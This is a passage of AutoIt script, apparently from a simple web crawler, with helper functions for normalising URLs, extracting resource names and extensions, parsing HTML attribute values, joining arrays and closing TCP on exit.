   $sURL = StringReplace($sURL,"\","/")
   $UrlPart = Stringsplit($sURL,"/")
   For $i=1 To $UrlPart[0]-1
   if Stringlen($UrlPart[$i])>0 Then
    if $UrlPart[$i] = "." Or $UrlPart[$i] = ".." Then
     $UrlPart[$i] = ""
    Else
     if $UrlPart[$i+1] = ".." Then
      $UrlPart[$i] = ""
      $UrlPart[$i+1] = ""
     EndIf
    EndIf
   EndIf
   Next
   $sNewURL = join($UrlPart,"/")
   While( StringInStr($sNewURL,"//")>0 )
    $sNewURL = Stringreplace($sNewURL,"//","/")
   WEnd
   $sNewURL = Stringreplace($sNewURL,":/","://")
   if Stringleft($sNewURL,1) = "/" Then
       $sNewURL = Stringright($sNewURL,Stringlen($sNewURL)-1)
   EndIf
   If ( StringInStr($sNewURL,"#")>0 And LastIndexOf($sNewURL,"&",false)<StringInStr($sNewURL,"#") ) Then $sNewURL = StringLeft($sNewURL,StringInStr($sNewURL,"#")-1)
   Return($sNewURL)
   EndFunc

   Func GetResourceName($sPath);returns the name of the resource from the given url
   $sPath = Stringreplace($sPath, "\", "/")
   $ndx = LastIndexOf($sPath, "/", false)
   $ResourceName = ""
   if ( $ndx = -1 ) then
    $ResourceName = $sPath
   else
    $ResourceName = Stringright($sPath, Stringlen($sPath)-$ndx-1)
   EndIf
   if Stringlen($ResourceName) = 0 Then $ResourceName = "index"
   Return($ResourceName)
   EndFunc

   Func GetResourceExtension($sPath);returns the resource's extension
   $ResName = GetResourceName($sPath)
   $ndx = LastIndexof($ResName, ".", false)+2
   $Ext = ""
   if ( $ndx = 0 ) then
    Return($Ext)
   Endif
   $Ext = Stringmid($ResName, $ndx)
   if stringinstr($ext,"?")>0 then $ext = stringleft($ext,indexof($ext,"?",false))
   Return($Ext)
   EndFunc

   Func GetOption($opt,$HTMLline);returns the value of the specified HTML parameter
   Dim $Link = ""
   $opt=$opt&"="
   Dim $ndx = IndexOf($HTMLline, $opt, false)
   if ( $ndx = -1 ) then Return("")
   $ndx = $ndx + Stringlen($opt) + 2
   Dim $end_char = stringmid($HTMLLine,$ndx-1,1)
   if $end_char<>"'" and $end_char<>"""" Then
       $end_char = " "
   EndIf
   For $i = $ndx to Stringlen($HTMLline)
    $char = ""
    $char = Stringmid($HTMLline,$i,1)
    if ( $char <> $end_char ) then
     $Link = $Link & $char
    else
     ExitLoop
    endif
   Next
   Return($Link)
   EndFunc

   Func join($array,$join_char);split function^(-1)
       If UBound($array) = 0 Then Return("")
       Dim $res
       For $e=1 To $array[0]
           $res = $res & $array[$e] & $join_char
       Next
       Return(StringLeft($res,StringLen($res)-1))
   EndFunc

   func onautoitexit();on exit,
       TCPShutdown()
   EndFunc
